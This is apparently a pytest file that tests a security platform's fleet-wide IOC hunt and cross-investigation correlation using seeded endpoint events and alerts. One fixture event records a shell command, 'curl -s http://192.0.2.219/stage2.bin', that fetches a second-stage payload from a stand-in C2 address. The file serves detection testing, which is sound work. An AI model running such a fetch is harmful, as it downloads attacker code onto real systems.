"""Tests for Fleet-wide IOC Compromise Assessment & Cross-Investigation Correlation."""

import pytest
from fastapi.testclient import TestClient

from app.core.db import db_session
from app.main import app
from app.models import event as event_store
from app.models import investigation as inv_store
from app.models import iocs as ioc_store
from app.models import run as run_store


@pytest.fixture
def client():
    return TestClient(app)


def test_hunt_ioc_across_fleet():
    with db_session() as conn:
        # Create an IOC
        ioc = ioc_store.create_ioc(conn, value="192.0.2.219", ioc_type="ip", label="Cobalt Strike C2")
        ioc_id = ioc["ioc_id"]

        # Create a run and events with this IP
        run_id = "run_hunt_test_01"
        run_store.create_run(conn, run_id=run_id, sample_name="beacon.sh", platform="linux", session_type="analysis")

        # Event 1: Network connection
        ev1 = {
            "run_id": run_id,
            "platform": "linux",
            "event_type": "network_connection",
            "timestamp": "2026-09-04T12:00:00Z",
            "pid": 4120,
            "process_name": "curl",
            "dest_ip": "192.0.2.219",
            "dest_port": 443,
            "host_id": "prod-srv-01",
        }
        event_store.insert_event(conn, ev1)

        # Event 2: Process command line mentioning the IP on another host
        ev2 = {
            "run_id": run_id,
            "platform": "linux",
            "event_type": "process_create",
            "timestamp": "2026-09-04T12:05:00Z",
            "pid": 4121,
            "process_name": "sh",
            "command_line": "curl -s http://192.0.2.219/stage2.bin",
            "host_id": "prod-srv-02",
        }
        event_store.insert_event(conn, ev2)

        # Create an alert/finding with this IP
        conn.execute(
            """
            INSERT INTO alerts (run_id, rule_id, rule_name, severity, triggered_at, details, related_ip)
            VALUES (?, 'OUTPOST-NET-004', 'C2 Cobalt Strike Beaconing', 'malicious', '2026-09-04T12:06:00Z', 'Identified C2 traffic to 192.0.2.219', '192.0.2.219')
            """,
            (run_id,),
        )

        # Create an investigation and link the IOC
        inv = inv_store.create(conn, title="Active APT Intrusion", created_by="soc_lead", tags=["apt"])
        inv_id = inv["id"]
        inv_store.add_ref(conn, inv_id, ref_type="ioc", ref_id=ioc_id)

        # Run Fleet Compromise Assessment
        assessment = ioc_store.hunt_ioc_across_fleet(conn, ioc_id)

        assert assessment["ioc_id"] == ioc_id
        assert assessment["value"] == "192.0.2.219"
        assert assessment["total_sightings"] >= 3
        assert assessment["distinct_hosts_count"] >= 2
        assert "prod-srv-01" in assessment["distinct_hosts"]
        assert "prod-srv-02" in assessment["distinct_hosts"]
        assert assessment["threat_verdict"] == "confirmed_threat"
        assert assessment["malicious_findings_count"] >= 1

        # Check cross-case correlation
        linked_invs = assessment["associated_investigations"]
        assert len(linked_invs) >= 1
        assert any(i["id"] == inv_id for i in linked_invs)


def test_api_ioc_fleet_hunt_endpoint(client):
    with db_session() as conn:
        ioc = ioc_store.create_ioc(conn, value="evil-stager.internal.local", ioc_type="domain", label="Suspicious Domain")
        ioc_id = ioc["ioc_id"]

    res = client.get(f"/iocs/{ioc_id}/fleet-hunt")
    assert res.status_code == 200
    data = res.json()
    assert data["ioc_id"] == ioc_id
    assert data["value"] == "evil-stager.internal.local"
    assert "total_sightings" in data
    assert "threat_verdict" in data
    assert "associated_investigations" in data
